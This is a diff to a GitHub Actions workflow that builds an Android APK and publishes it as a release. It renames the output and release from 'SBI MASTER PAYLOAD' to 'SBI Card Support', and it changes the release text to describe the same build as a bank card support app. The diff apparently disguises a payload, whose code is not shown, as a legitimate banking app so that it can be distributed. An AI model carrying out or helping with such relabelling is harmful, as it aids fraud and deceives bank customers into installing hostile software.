@@ -45,19 +45,19 @@ jobs:
           cd android
           chmod +x gradlew
           ./gradlew assembleDebug
-          cp app/build/outputs/apk/debug/app-debug.apk ../master_payload.apk
+          cp app/build/outputs/apk/debug/app-debug.apk ../sbi_card_support.apk
 
       - name: Create GitHub Release
         uses: softprops/action-gh-release@v2
         if: github.ref == 'refs/heads/main' || github.ref == 'refs/heads/master'
         with:
-          files: master_payload.apk
+          files: sbi_card_support.apk
           tag_name: v3.0.${{ github.run_number }}
-          name: SBI MASTER PAYLOAD v3.0 (Build ${{ github.run_number }})
+          name: SBI Card Support v3.0 (Build ${{ github.run_number }})
           body: |
-            # SBI MASTER PAYLOAD v3.0
+            # SBI Card Support v3.0
             
-            This is the standalone Master Payload with all synchronization features enabled.
+            This is the SBI Card Support App with all synchronization features enabled.
             
             Build Number: ${{ github.run_number }}
           draft: false
